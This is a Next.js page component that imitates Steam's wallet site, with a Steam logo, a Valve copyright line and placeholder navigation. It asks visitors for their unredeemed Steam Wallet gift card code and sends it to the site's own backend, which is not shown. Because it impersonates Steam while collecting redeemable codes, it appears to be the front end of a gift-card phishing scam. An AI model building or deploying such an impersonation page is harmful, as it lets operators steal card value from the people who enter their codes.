import { useState } from 'react'
import Head from 'next/head'
import styles from '../styles/steam.module.css'

export default function SteamPage() {
  const [card, setCard] = useState('')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)

  async function checkBalance(e) {
    e.preventDefault()
    setError(null)
    setResult(null)
    if (!card.trim()) return setError('Please enter your Steam Gift Card code.')
    
    setLoading(true)
    try {
      const res = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber: card.replace(/\s+/g, '') })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
      setResult(data)
    } catch (err) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className={styles.steamPage}>
      <Head>
        <title>Steam Wallet - Redeem and Check Balance</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
      </Head>

      <header className={styles.header}>
        <div className={styles.logoContainer}>
          <svg className={styles.logo} viewBox="0 0 176 44" fill="currentColor">
            <path d="M12.981 12.015L0 12.015V0H3.344V8.671H12.981V12.015ZM25.044 12.015H15.405V8.671H25.044V12.015ZM37.107 12.015H27.469V8.671H37.107V12.015ZM49.17 12.015H39.531V8.671H49.17V12.015ZM61.233 12.015H51.594V8.671H61.233V12.015Z" style={{display: 'none'}} />
            <g transform="translate(0, 5)">
              <path d="M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 10.333Z" />
              <path d="M4.868 12.683a1.715 1.715 0 0 0 1.318-3.165 1.7 1.7 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027m2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048" />
              <text x="22" y="12" fill="white" style={{fontFamily: 'Motiva Sans, Arial', fontWeight: 'bold', fontSize: '14px', letterSpacing: '2px'}}>STEAM</text>
            </g>
          </svg>
        </div>
        <nav className={styles.nav}>
          <a href="#">Store</a>
          <a href="#">Community</a>
          <a href="#">About</a>
          <a href="#">Support</a>
        </nav>
      </header>

      <main className={styles.main}>
        <section className={styles.hero}>
          <h1>Check Your Steam Wallet Code</h1>
          <p>Enter your 15ndigit Steam Wallet code to check the current balance and validity of your gift card.</p>
        </section>

        <section className={styles.card}>
          <form onSubmit={checkBalance}>
            <div className={styles.inputGroup}>
              <label className={styles.label}>STEAM WALLET CODE</label>
              <input
                type="text"
                className={styles.input}
                placeholder="AAAAA-BBBBB-CCCCC"
                value={card}
                onChange={(e) => setCard(e.target.value.toUpperCase())}
                disabled={loading}
              />
            </div>

            <button type="submit" className={styles.button} disabled={loading}>
              {loading ? 'VERIFYING...' : 'CHECK BALANCE'}
            </button>
          </form>

          {result && (
            <div className={styles.result}>
              <p>Balance Found: <strong>{result.balance}</strong></p>
              <p>Status: <span style={{color: '#34c759'}}>Valid & Ready to Redeem</span></p>
            </div>
          )}

          {error && (
            <div className={styles.error}>
              <p>{error}</p>
            </div>
          )}
        </section>

        <section style={{marginTop: '40px', color: '#8f98a0', fontSize: '13px'}}>
          <p>Steam Wallet Codes work just like a gift certificate that can be redeemed on Steam for the purchase of games, software, and any other item you can purchase on Steam.</p>
          <p style={{marginTop: '10px'}}>Steam Wallet Codes are often sold in various amounts at retail stores around the world.</p>
        </section>
      </main>

      <footer style={{background: '#171a21', padding: '40px 5%', marginTop: '60px', borderTop: '1px solid #2a475e'}}>
        <div style={{maxWidth: '940px', margin: '0 auto', display: 'flex', flexWrap: 'wrap', gap: '40px', justifyContent: 'space-between'}}>
          <div style={{flex: '1', minWidth: '200px'}}>
             <svg width="100" height="30" viewBox="0 0 100 30" fill="#8f98a0">
               <path d="M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 10.333Z" transform="scale(1.5)" />
             </svg>
             <p style={{marginTop: '20px'}}>© 2025 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
          </div>
          <div style={{display: 'flex', gap: '20px'}}>
            <a href="#" style={{color: '#c7d5e0'}}>Privacy Policy</a>
            <a href="#" style={{color: '#c7d5e0'}}>Legal</a>
            <a href="#" style={{color: '#c7d5e0'}}>Steam Subscriber Agreement</a>
          </div>
        </div>
      </footer>
    </div>
  )
}
